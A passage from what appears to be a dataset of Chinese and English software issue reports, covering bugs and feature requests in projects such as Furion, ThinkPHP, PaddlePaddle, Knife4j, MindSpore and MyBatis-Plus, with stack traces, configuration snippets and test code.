System.Linq.Enumerable.WhereSelectEnumerableIterator`2.GetCount(Boolean onlyIfCheap) at Furion.DatabaseAccessor.DbContextPool.SavePoolNow() in D:\Code\Test\Furion\framework\Furion\DatabaseAccessor\Pools\DbContextPool.cs:line 123 at Furion.DatabaseAccessor.UnitOfWorkFilter.OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next) in D:\Code\Test\Furion\framework\Furion\DatabaseAccessor\UnitOfWork\Filters\UnitOfWorkFilter.cs:line 67 at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync() --- End of stack trace from previous location --- at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Awaited|25_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 如果数据不存在，返回Null   <code>: UPDATE ""User"" SET ""IsDeleted"" = 'True', ""UpdatedTime"" = '2021-05-06T12:00:04+08:00', ""UpdatedUserId"" = '1', ""UpdatedUserName"" = 'Sa' WHERE ""Id"" = '55'; SELECT changes(); 1 commandBatches, IRelationalConnection connection) at Microsoft.EntityFrameworkCore.Storage.RelationalDatabase.SaveChanges(IList 1 entriesToSave) at Microsoft.EntityFrameworkCore.ChangeTracking.Internal.StateManager.SaveChanges(DbContext _, Boolean acceptAllChangesOnSuccess) at Microsoft.EntityFrameworkCore.Storage.NonRetryingExecutionStrategy.Execute[TState,TResult](TState state, Func 3 verifySucceeded) at Microsoft.EntityFrameworkCore.ChangeTracking.Internal.StateManager.SaveChanges(Boolean acceptAllChangesOnSuccess) at Microsoft.EntityFrameworkCore.DbContext.SaveChanges(Boolean acceptAllChangesOnSuccess) at Microsoft.EntityFrameworkCore.DbContext.SaveChanges() at Furion.DatabaseAccessor.DbContextPool.&lt;&gt;c.&lt;SavePoolNow&gt;b__9_1(KeyValuePair /// &lt;summary&gt; /// 删除一条 /// &lt;/summary&gt; /// &lt;param name=""id""&gt;&lt;/param&gt; public async Task Delete(int id) { await _userRepo.FakeDeleteAsync(id); }"
多图并发上传时，偶尔出现重名导致图片被覆盖,"多张图片同时上传，如 、 、 、 、 ，上传结果偶尔出现第3张跟第4张显示一样，而实际目录下只保存了4张图片。 问题追踪 上传文件重命名时使用了TP框架的 vendor/topthink/framework/src/think/File.php 的 hashName 方法： 文件 app/common/library/storage/engine/Basics.php 中的 getSaveFileInfo 方法执行为 ，因此使用 来重命名文件。然而，在机器性能比较好的情况下，并发上传就会大概率出现文件重名！ 解决方案 将文件 app/common/library/storage/engine/Basics.php 中的 改成： 用了 uniqid + mt_rand 函数，可以确保输出重名的文件概率几乎为零。   <code>: 1.jpg 2.jpg 3.jpg 4.jpg 5.jpg /** * 自动生成文件名 * @access public * @param string|\Closure $rule * @return string */ public function hashName($rule = ''): string { if (!$this-&gt;hashName) { if ($rule instanceof \Closure) { $this-&gt;hashName = call_user_func_array($rule, [$this]); } else { switch (true) { case in_array($rule, hash_algos()): $hash = $this-&gt;hash($rule); $this-&gt;hashName = substr($hash, 0, 2) . DIRECTORY_SEPARATOR . substr($hash, 2); break; case is_callable($rule): $this-&gt;hashName = call_user_func($rule); break; default: $this-&gt;hashName = date('Ymd') . DIRECTORY_SEPARATOR . md5((string) microtime(true)); break; } } } return $this-&gt;hashName . '.' . $this-&gt;extension(); } $hashName = $this-&gt;file-&gt;hashName() md5((string) microtime(true)) $hashName = $this-&gt;file-&gt;hashName() $hashName = $this-&gt;file-&gt;hashName(function () { return date('Ymd') . DIRECTORY_SEPARATOR . md5(uniqid((string)mt_rand(), true)); });"
fluid.layers.increment op执行失败,"python 2.7 fluid 1.3 fluid.layers.increment貌似只支持传入variable的shape为[1, 1]，而不是每一元素都进行increase value，疑似bug，同样跟文档上说明也不一样，文档示例是跑不通的 (fluid.layers.increment)[http://www.paddlepaddle.org/documentation/api/en/0.15.0/layers.html#increment] 报错信息如下: 报错代码:   <code>: paddle.fluid.core.EnforceNotMet: Enforce failed. Expected 1 == framework::product(ctx-&gt;GetInputDim(""X"")), but received 1:1 != framework::product(ctx-&gt;GetInputDim(""X"")):2. def test_increment(): with fluid.program_guard(fluid.Program()): data = fluid.layers.data(name='data', shape=[1, 2], append_batch_size=False, dtype='float32') ret = fluid.layers.increment(x=data, value=1.0, in_place=True) place = fluid.CUDAPlace(0) exe = fluid.Executor(place) x = np.array([1.0, 1.0]) outs = exe.run( feed={'data':x}, fetch_list=[ret.name]) print(outs[0])"
Feature/travis pre commit checks,"Add hook check during Travis-CI Apply hooks to all files. NOTE: We use version 3.8 to auto-format. In MacOS, use In Ubuntu 14.04, use   <code>: pre-commit pre-commit clang-format brew install homebrew/versions/clang-format38 apt install clang-format-3.8"
Knife4J Aggregation 2.0.8 集成Nacos的问题,"JDK版本：AdoptOpenJDK 11.0.7 x64 hotspot Knife4J版本：2.0.8 SpringBoot版本：2.3.8.RELEASE SpringCloud Alibaba版本：2.2.4.RELEASE SpringCloud 版本：Hoxton.SR8 生产项目大部分微服务都在使用Nacos，微服务需要对文档进行聚合。早期一直都是在Gateway服务中去聚合其它服务。现在Knife4J出了Aggregation Starter，理念非常OK，但实际上基本无法应用于Nacos，主要存在的问题如下： 问题一、不支持Nacos认证 在如今信息安全要求如此之高的年代，不可能将Nacos裸奔，但将Nacos中的文件添加以下配置： 之后，Nacos就需要使用用户名和密码登录，但这样就造成了Knife4J Aggregation无法正常使用。 2个月前也有 Issue I28IF9 在说，期待下个版本解决。 问题二、不支持上下文 为确保Gateway网关转发的服务上下文一致，通常会给每个服务配置上下文： 然后再通过以下类似的Gateway网关配置去访问服务： 然后通过网关访问文档服务，例如：，打开的是空白页面，例如： 同时，控制台打印： 从以上打印的内容，发现Knife4J Aggregation打开的<em>认证服务</em>的URL为，该地址无上下文，正确的地址应该为 问题三、不能过滤健康的服务 Knife4J Aggregation会用到多个服务的聚合，比例20个服务。但其中只要有1个服务宕机，就会导致整个Knife4J Aggregation空白。Issue I2CKQT 同时在反馈，期待下个版本解决   <code>: application.properties nacos.core.auth.enabled=true server: port: 8200 servlet: context-path: /doc-service # 上下文配置 knife4j: enableAggregation: true nacos: enable: true serviceUrl: http://${spring.cloud.nacos.discovery.server-addr}/nacos routes: - name: 认证服务 serviceName: auth-service location: /v2/api-docs?group=default servicePath: /auth-service namespaceId: fw6 groupName: DEFAULT_GROUP spring: cloud: gateway: discovery: locator: lower-case-service-id: true # 将请求路径上的服务名配置为小写 routes: # 固定路由 - id: 认证服务 uri: lb://auth-service # 转发到负载均衡 predicates: - Path=/auth-service/** # 匹配哪些路径 filters: - StripPrefix=0 # 不截取前缀 - PreserveHostHeader # 发送原始请求的主机头 - id: 文档服务 uri: lb://doc-service # 转发到负载均衡，但实际会被拦截，uri参数必写 predicates: - Path=/doc-service/** # 匹配哪些路径 filters: - StripPrefix=0 - PreserveHostHeader # 发送原始请求的主机头 http://localhost:9000/doc-service/doc.html 2021-01-24 17:29:11.457 INFO 19468 --- [http-nio-8200-exec-1] com.github.xiaoymin.knife4j.aggre.core.filter.Knife4jRouteProxyFilter.doFilter:51 : Current Request:/doc-service/v2/api-docs 2021-01-24 17:29:11.457 INFO 19468 --- [http-nio-8200-exec-1] com.github.xiaoymin.knife4j.aggre.core.filter.Knife4jRouteProxyFilter.doFilter:52 : 当前请求是Proxy请求 2021-01-24 17:29:11.458 INFO 19468 --- [http-nio-8200-exec-1] com.github.xiaoymin.knife4j.aggre.core.RouteDispatcher.buildContext:228 : 目标请求Url:http://localhost:8100/v2/api-docs,请求类型:GET,Host:localhost 2021-01-24 17:29:11.461 INFO 19468 --- [http-nio-8200-exec-1] com.github.xiaoymin.knife4j.aggre.core.executor.ApacheClientExecutor.buildRequest:36 : ApacheClient Uri:http://localhost:8100/v2/api-docs 2021-01-24 17:29:11.471 INFO 19468 --- [http-nio-8200-exec-1] com.github.xiaoymin.knife4j.aggre.core.RouteDispatcher.writeResponseHeader:149 : 响应类型:text/html;charset=utf-8,响应编码:UTF-8 2021-01-24 17:29:11.474 INFO 19468 --- [http-nio-8200-exec-1] com.github.xiaoymin.knife4j.aggre.core.filter.Knife4jRouteProxyFilter.doFilter:54 : 执行完毕 http://localhost:8100/v2/api-docs auth-service http://localhost:8100/auth-service/v2/api-docs"
[CT][MS][addcmul]addcmultest_addcmul_input_different_dtype_value have Accuracy issues on cpu,"test_addcmul_input_different_dtype_value have Accuracy issues on cpu / 硬件环境: cpu /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): graph/pynative /mode pynative /mode graph addcmultest_addcmul_input_different_dtype_value pytest -s -v operations/test_addcmul.py::test_addcmul_input_different_dtype_value case pass   <code>: def test_addcmul_input_different_dtype_value(): input_data = Tensor(np.random.randn(3), dtype=mstype.float16) x1 = Tensor(np.random.randn(3), dtype=mstype.float16) x2 = Tensor(np.random.randn(3), dtype=mstype.float16) value = Tensor(np.array(1), dtype=mstype.float32) fact = AddcmulMock(inputs=[input_data, x1, x2, value]) &gt; fact.forward_cmp() ../operations/test_addcmul.py:430: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/addcmul_ops.py:71: in forward_cmp allclose_nparray(out_pytorch, out_mindspore.asnumpy(), self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([-0.557, 2.059, -0.725], dtype=float16) data_me = array([-0.5967, -0.532 , -0.2834], dtype=float16), rtol = 0.001 atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-0.557 2.059 -0.725] E data_me_error:[-0.5967 -0.532 -0.2834] E loss:[0.03955 2.59 0.4417 ]"
Fluid distributed training performance is terrible using GPU,"Running vgg16 with cifar10 dataset. Using to submit a fluid cluster job with 5 pservers and 5 trainers. Trainers request 1 GPU each using CUDA: 8 cuDNN: 5 driver version: 375.26 GPU: P40 HostNetwork Additional information: I see that CPU usage is up to 100% for a long time in the container, may be the CPU becomes the bottle neck? Per mini-batch time: around 60s When CPU only, it's arount 10s.   <code>: kubectl alpha.kubernetes.io/nvidia-gpu: 1 -------------------------&gt; Profiling Report &lt;------------------------- Time unit: ms Sorted by total time in descending order in the same thread Event Calls Total Min. Max. Ave. thread0::split 5865 1.11765e+07 2.63047 6652.4 1905.63 thread0::concat 5865 1.09052e+07 2.61659 6175.19 1859.36 thread0::send 391 2.29786e+06 327.89 13663.4 5876.87 thread0::conv2d_grad 5083 893.141 0.065567 104.159 0.175711 thread0::conv2d 5083 807.148 0.051993 11.0981 0.158794 thread0::fill_zeros_like 25806 562.583 0.012788 11.0516 0.0218005 thread0::batch_norm 5474 525.538 0.055927 6.09994 0.0960062 thread0::batch_norm_grad 5474 346.792 0.044622 9.09123 0.0633526 thread0::elementwise_add_grad 6256 341.264 0.037377 8.06849 0.0545499 thread0::elementwise_add 6256 295.606 0.024 7.93195 0.0472516 thread0::dropout 3910 191.713 0.033447 6.07088 0.0490315 thread0::pool2d 1955 183.506 0.036702 9.3676 0.0938649 thread0::mul 1173 158.41 0.035665 8.38415 0.135047 thread0::pool2d_grad 1955 151.755 0.041505 8.08374 0.0776243 thread0::relu 5474 143.952 0.015749 5.04012 0.0262974 thread0::dropout_grad 3910 131.019 0.022926 5.03294 0.0335086 thread0::relu_grad 5474 130.262 0.016308 0.196264 0.0237965 thread0::mul_grad 1173 125.795 0.055516 3.11973 0.107242 thread0::cast 782 34.6569 0.019949 0.660779 0.0443183 thread0::softmax 391 33.7846 0.043393 0.707031 0.0864057 thread0::fetch 782 27.9014 0.02143 0.06991 0.0356795 thread0::elementwise_mul 391 22.6289 0.029586 0.658594 0.0578745 thread0::sum 782 21.7157 0.015956 0.057544 0.0277695 thread0::mean 391 20.8824 0.017462 0.680731 0.0534077 thread0::cross_entropy 391 18.9823 0.023271 7.04633 0.0485482"
访问不了啊？？,"这个是我的配置 #log_format main '$remote_addr - $remote_user [$time_local] ""$request"" ' '$status $body_bytes_sent ""$http_referer"" ' '""$http_user_agent"" ""$http_x_forwarded_for""'; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server { listen 80; server_name localhost; #charset koi8-r; } another virtual host using mix of IP-, name-, and port-based configuration #server { listen 8000; listen somename:8080; server_name somename alias another.alias; location / { root html; index index.html index.htm; } #} HTTPS server #server { listen 443 ssl; server_name localhost; ssl_certificate cert.pem; ssl_certificate_key cert.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; location / { root html; index index.html index.htm; } #} 但是我用127.0.0.1:8080/iBase4j/index.jsp或者http://localhost:8080/iBase4J/iBase4J-UI都访问不了 报{""httpCode"":401,""msg"":""没有登录"",""timestamp"":1506254262671} 请问一下tomcat是只部署iBase4J-Biz-Web吗??   <code>: #access_log logs/host.access.log main; # 静态页面目录 root E:\Code\iBase4J\iBase4J-UI; # 默认首页 index index.html; location / { # 用户浏览器端的缓存设置 location ~ .*\.(js|css|jpg|jpeg|gif|png|swf|htm|html|json|xml|svg|woff|ttf|eot|map|ico)$ { expires 1h; if (-f $request_filename) { break; } } # 动态页面 if ( !-e $request_filename) { proxy_pass http://127.0.0.1:8080; } }"
基于Page<?> 参数的 condition map 条件无效,"经测试，通过 Page 参数的condition map 传递的参数在最终没有反应到sql上，跑自带的测试也是如此， 是否缺少什么设置？ 请帮确认下， com.baomidou.mybatisplus.test.h2.H2UserTest. 得到sql : Preparing: SELECT COUNT(1) FROM ( SELECT test_id AS id,name,age,price,test_type AS testType,desc,last_updated_dt AS lastUpdatedDt,version FROM h2User ) TOTAL Parameters: Preparing: SELECT test_id AS id,name,age,price,test_type AS testType,desc,last_updated_dt AS lastUpdatedDt,version FROM h2User limit 3 Parameters: Total: 3   <code>: @Test public void testCondition() { Page&lt;H2User&gt; page = new Page&lt;&gt;(1, 3); Map&lt;String, Object&gt; condition = new HashMap&lt;&gt;(); condition.put(""test_type"", 23); page.setCondition(condition); Page&lt;H2User&gt; pageResult = userService.selectPage(page); for (H2User u : pageResult.getRecords()) { System.out.println(u); } System.out.println(pageResult.getTotal()); }"
ShowWaitFormre显示任务栏图标导致全屏程序失效,SunnyUI 版本号 V3.2.2 SunnyUI 引用来源 Nuget Gitee Github 其他 操作系统 Win7 Win10 Win11 WindowsXP 其他 .Net运行环境版本 .Net Framework4.0 .Net Framework4.5 .Net Framework4.7.2 .Net6 其他 发生了什么问题？ ShowWaitForm 加载过程中会在任务栏出现图标，一般情况下除了影响美观外并不影响使用。 但是在全屏的程序中，经常会因为这个导致任务栏出现在全屏程序上，在自助机等场景下用户会乱操作。 问题贴图 请贴出发生问题时候的截图：   <code>: //加载提示 ShowWaitForm(); Thread.Sleep(1000); SetWaitFormDescription(UILocalize.SystemProcessing);
How to do joint optimization using PaddlePaddle,I am copying this question from Andrew to here: How do I optimize multiple cost functions jointly? Can I do to optimize two classification costs?   <code>: paddle.layer.classification_cost(...) + paddle.layer.classification_cost(...)
对网络添加print支持,"类似torch网络的print 输出   <code>: from torch import nn class Net(nn.Module): def __init__(self) -&gt; None: super().__init__() self.conv = nn.Sequential( nn.Conv2d(3, 3, 3), nn.BatchNorm2d(3), nn.ReLU()) def forward(x): x = self.conv(x) return x if __name__ == ""__main__"": net = Net() print(net) Net( (conv): Sequential( (0): Conv2d(3, 3, kernel_size=(3, 3), stride=(1, 1)) (1): BatchNorm2d(3, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (2): ReLU() ) )"
fix 910 memory size of GetInputInfo,"is element num, is memory size   <code>: mindspore::tensor::Tensor::DataSize mindspore::tensor::Tensor::Size"
保存后模型可视化比模型定义最后输出多了一层scale,"网络模型最后一层是sigmoid，但是保存下来的模型用netron可视化之后，发现多了scale层，请问是什么问题。网络定义的脚本如下：Net 函数是主体网络结构。   <code>: import paddle.fluid as fluid import cv2, numpy import os class Canny(): def __init__(self, output_channels, base_channels): self.out_c = output_channels self.base_channels = base_channels def ConvLayer(self, input_data, out_c, kernel_size, stride): # only conv not include relu padding_size = kernel_size // 2 x = fluid.layers.pad2d(input=input_data, paddings=[padding_size, padding_size, padding_size, padding_size], mode='reflect') x = fluid.layers.conv2d( input=x, num_filters=out_c, filter_size=kernel_size, stride=stride, padding=0, groups=1, act=None, bias_attr=False, name=None) return x def ResidualBlock(self, input_data, channels, kernel_size, stride): norm = 'instance_norm' x_conv1 = self.ConvLayer(input_data, channels, kernel_size, stride) x_in1 = norm_layer(x_conv1, norm) x_relu = fluid.layers.relu(x_in1) x_conv2 = self.ConvLayer(x_relu, channels, kernel_size, stride) x_in2 = norm_layer(x_conv2, norm) x_out = x_in2 + input_data return x_out def ConvInReluLayer(self, input_data, channels, kernel_size, stride): norm = 'instance_norm' x_conv = self.ConvLayer(input_data, channels, kernel_size, stride) x_in = norm_layer(x_conv, norm) x_relu = fluid.layers.relu(x_in) return x_relu def Net(self, input_data): # Encoder network x = self.ConvInReluLayer(input_data, self.base_channels, kernel_size=9, stride=1) x = self.ConvInReluLayer(x, 2*self.base_channels, kernel_size=3, stride=2) x = self.ConvInReluLayer(x, 2*2*self.base_channels, kernel_size=3, stride=2) # Residual Network for i in range(5): x = self.ResidualBlock(x, 2*2*self.base_channels, kernel_size=3, stride=1) # Decoder Network x = fluid.layers.resize_bilinear(x, scale=2.0) x = self.ConvLayer(x, 2*self.base_channels, kernel_size=3, stride=1) x = fluid.layers.relu(x) x = fluid.layers.resize_bilinear(x, scale=2.0) x = self.ConvLayer(x, self.base_channels, kernel_size=3, stride=1) x = fluid.layers.relu(x) x = self.ConvLayer(x, self.out_c, kernel_size=9, stride=1) x = fluid.layers.sigmoid(x) return x def norm_layer(input, norm_type='batch_norm', name=None, is_test=False): #print 'norm:', norm_type if norm_type == 'batch_norm': param_attr = fluid.ParamAttr( name = None if name is None else name + '_w', initializer=fluid.initializer.Constant(1.0)) bias_attr = fluid.ParamAttr( name = None if name is None else name + '_b', initializer=fluid.initializer.Constant(value=0.0)) return fluid.layers.batch_norm( input, param_attr=param_attr, bias_attr=bias_attr, is_test=is_test, moving_mean_name=None if name is None else name + '_mean', moving_variance_name=None if name is None else name + '_var') elif norm_type == 'instance_norm': helper = fluid.layer_helper.LayerHelper(""instance_norm"", **locals()) dtype = helper.input_dtype() epsilon = 1e-5 mean = fluid.layers.reduce_mean(input, dim=[2, 3], keep_dim=True) var = fluid.layers.reduce_mean( fluid.layers.square(input - mean), dim=[2, 3], keep_dim=True) if name is not None: scale_name = name + ""_scale"" offset_name = name + ""_offset"" else: scale_name = None offset_name = None scale_param = fluid.ParamAttr( name=scale_name, initializer=fluid.initializer.Constant(1.0), trainable=True) offset_param = fluid.ParamAttr( name=offset_name, initializer=fluid.initializer.Constant(0.0), trainable=True) scale = helper.create_parameter( attr=scale_param, shape=input.shape[1:2], dtype=dtype) offset = helper.create_parameter( attr=offset_param, shape=input.shape[1:2], dtype=dtype) tmp = fluid.layers.elementwise_mul(x=(input - mean), y=scale, axis=1) tmp = tmp / fluid.layers.sqrt(var + epsilon) tmp = fluid.layers.elementwise_add(tmp, offset, axis=1) return tmp else: raise NotImplementedError(""norm tyoe: [%s] is not support"" % norm_type)"
[ST][MS][NET][yolov3-darknet53\facerecognition\resnet101\vgg16][GPU(v100)][8p]train fail,"Use this template for r[ST][MS][NET][yolov3-darknet53]loss sometimes print 'nan'eporting a bug yolov3-darknet53, facerecognition, resnet101, vgg16 在GPU（v100）训练时loss打印nan / 硬件环境: /device GPU/ : -- MindSpore version :r1.7.0 B120 commit_id:bbb534a4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_yolov3_darknet53_gpu_train_check_fps_8p_0002 get code from models sh run_distribute_train_gpu.sh 训练成功，loss正常打印 备注 提给曾子韬   <code>: [ERROR] AKG:2022-11-28-00:28:09.320.053 [broadcast.h:82] [detail] Check failed: false: Incompatible broadcast dims: 9 and 96 in: [64, 32, 9] and [64, 3, 96] Stack trace: [bt] (0) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(dmlc::LogMessageFatal::~LogMessageFatal()+0x5c) [0x7fbd65d32abc] [bt] (1) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(topi::detail::BroadcastShape(air::Array&lt;air::Expr, void&gt; const&amp;, air::Array&lt;air::Expr, void&gt; const&amp;)+0x11c7) [0x7fbd65e00117] [bt] (2) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(air::Tensor topi::detail::WithBroadcast&lt;topi::add(air::Tensor const&amp;, air::Tensor const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;)::{lambda(air::Expr, air::Expr)#1}&gt;(topi::add(air::Tensor const&amp;, air::Tensor const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;)::{lambda(air::Expr, air::Expr)#1}, air::Tensor const&amp;, air::Tensor const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const)+0x5c) [0x7fbd65e0131c] [bt] (3) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(topi::add(air::Tensor const&amp;, air::Tensor const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;)+0xc7) [0x7fbd65e01687] [bt] (4) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(+0x105fc40) [0x7fbd65db6c40] [bt] (5) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(+0x1060214) [0x7fbd65db7214] [bt] (6) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(akg::Emitter::EmitTopi(air::ir::Provide const*, air::Array&lt;air::NodeRef, void&gt; const&amp;)+0x14f) [0x7fbd65e0567f] [bt] (7) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(akg::Emitter::Visit_(air::ir::Provide const*)+0xf0) [0x7fbd65e07140] [bt] (8) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/plugin/gpu11.1/libakg.so(akg::Emitter::Visit_(air::ir::AttrStmt const*)+0x33f) [0x7fbd65e086bf]"
[Paddle-TRT] FP16 with cublasGemmStridedBatchedEx,"-PaddlePaddle version: develop -GPU: including CUDA/CUDNN version -OS Platform Ubuntu 16.04 Describe the feature and the current behavior/state. The implementation in blas_impl.cu.h doesn't use the when the data type is fp16, even the is greater than 9010. has more capability like selecting the algorithm (reference), it also performs better performance. We should use it when available, i.e., . So the code should be like this:   <code>: cublasGemmStridedBatchedEx CUDA_VERSION cublasGemmStridedBatchedEx CUDA_VERSION &gt;= 9010 #if CUDA_VERSION &gt;= 9010 cublasGemmAlgo_t algo = CUBLAS_GEMM_DFALT; bool use_tensor_op_math = context_.tensor_core_available(); if (FLAGS_enable_cublas_tensor_op_math &amp;&amp; use_tensor_op_math) { algo = CUBLAS_GEMM_DFALT_TENSOR_OP; } VLOG(5) &lt;&lt; ""use_tensor_op_math: "" &lt;&lt; (use_tensor_op_math ? ""True"" : ""False""); auto fp = std::is_same&lt;T, float&gt;::value ? CUDA_R_32F : CUDA_R_16F; context_.TensorCoreCublasCallIfAvailable([&amp;](cublasHandle_t handle) { PADDLE_ENFORCE_CUDA_SUCCESS(platform::dynload::cublasGemmStridedBatchedEx( handle, cuTransB, cuTransA, N, M, K, &amp;alpha, B, fp, ldb, strideB, A, fp, lda, strideA, &amp;beta, C, fp, ldc, strideC, batchCount, fp, algo)); }); #else // CUDA_VERSION &lt; 9010 context_.CublasCall([&amp;](cublasHandle_t handle) { CUBlas&lt;T&gt;::GEMM_STRIDED_BATCH(handle, cuTransB, cuTransA, N, M, K, &amp;alpha, B, ldb, strideB, A, lda, strideA, &amp;beta, C, ldc, strideC, batchCount); }); #endif // CUDA_VERSION &gt;= 9010"
frequent CI test failures on certain unit tests,We need to address these frequent failures for the Teamcity CI system to run smoothly: http://172.19.32.20:8111/viewLog.html?buildId=1100&amp;buildTypeId=Paddle_PrCi&amp;tab=buildLog&amp;_focus=8207 http://172.19.32.20:8111/viewLog.html?buildId=1103&amp;buildTypeId=Paddle_PrCi&amp;tab=buildLog&amp;_focus=13799   <code>: [23:28:05] [Step 1/1] 52 - test_ProtoServer (Failed) [23:28:05] [Step 1/1] 56 - test_TrainerOnePass (Failed)
backend/`TensorRTEngineOp`,"Some primary ideas, the interface of the Op inputs outputs attributes input_sources: ""fc:Out mul:Y"" output_sources: ""mul:X"" desc: serialized BlockDesc. max_batch_size (for TensorRT) max_workspace (for TensorRT) the indicates where the inputs are from, the indicate the operators this output belongs to. So that the logic inside the knows how to convert the Tensor between Fluid and TensorRT space.   <code>: TensorRTEngineOp input_sources output_sources convert_io TensorRTEngineOp"
站点任务中头像类任务无法完成,环境: Discuz版本: 问题描述:   <code>: CentOS 7 x64 PHP7.1 20180101 添加头像类任务后，无论是用HTML5上传头像或者用Flash上传头像，均无法完成头像类任务。
【bug】网关配置问题,gateway网关中配置了locator.enabled=true会导致gateway自动从nacos获取注册的服务，并根据服务名自动生成相关路由。导致下面自己配置的路由因为重复了其实并没有生效，路由走的是自动生成的路由。   <code>: spring: redis: host: localhost port: 6379 password: cloud: gateway: discovery: locator: lowerCaseServiceId: true enabled: true routes: # 认证中心 - id: ruoyi-auth uri: lb://ruoyi-auth predicates: - Path=/auth/** filters: # 验证码处理 - CacheRequestFilter - ValidateCodeFilter - StripPrefix=1
Use a standard RPC library instead of manual implement it.,"background In Paddle, we manually implement an RPC library for communication. The ProtoServer is the base class for RPC server, the BaseClient is the base class for RPC client. The code here is used for register method in PServer. The pros and cons are listed below: pros The performance is well because the implementation is very thin and fine-tuned. It was written from raw TCP stack and raw RDMA stack. cons It is not very stable, even in HPC cluster. The reasons are: It use send receive IOVs, and this API in Linux use a 32bit length. It may be overflow in a huge neural network with 1 or 2 PServers. It did not write any fault tolerance job. Write any illegal data in buffer or network has some error will cause whole cluster process die. It doesn't provide API or discover the disconnect process. Currently, one disconnect event will make every process die. It doesn't provide API, which is necessary for cluster service. conclusion To use a standard PROTO RPC library will make cluster API easier to expose and easier to write new logic code, but it may harm current Paddle network performance. So, should we change the Paddle RPC by using some standard RPC library? Please thumbs up/down this issue to vote!   <code>: PServer &lt;=&gt; PClient on_disconnect Authentication"
在SpringBoot使用WebApplicationType.REACTIVE模式下一些问题,1、使用SpringBoot启动WebApplicationType.REACTIVE。 public class Main { } 该模式下，无法使用增强模式，看了下源码，增强模式依赖之前JavaEE Servlet的组件。实现Filter模式。 2、由于采用动态模式生成文档信息加入DocumentCache，即在代码中手动调用SpringFox的API构建的文档信息，请求参数没有采用的$ref模式下的时候，UI页面展示请求参数为GET参数（或者form表单提交），实则原生的应该是RequestBody json（raw）。 如图，生成的Swagger接口返回：   <code>: public static void main(String[] args) { SpringApplication springApplication = new SpringApplication(Main.class); springApplication.setWebApplicationType(WebApplicationType.REACTIVE); springApplication.run(args); }
注入类失败,pigx版本: 2.2 操作系统:windows 是否修改包名: 是   <code>: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'equipmentConsumer' defined in file [D:\IdeaProjects\campus\campus-modules\campus-message\target\classes\com\campus\message\consumer\EquipmentConsumer.class]: Unsatisfied dependency expressed through constructor parameter 2; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.campus.common.minio.service.MinioTemplate' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {} at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:733) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:198) at 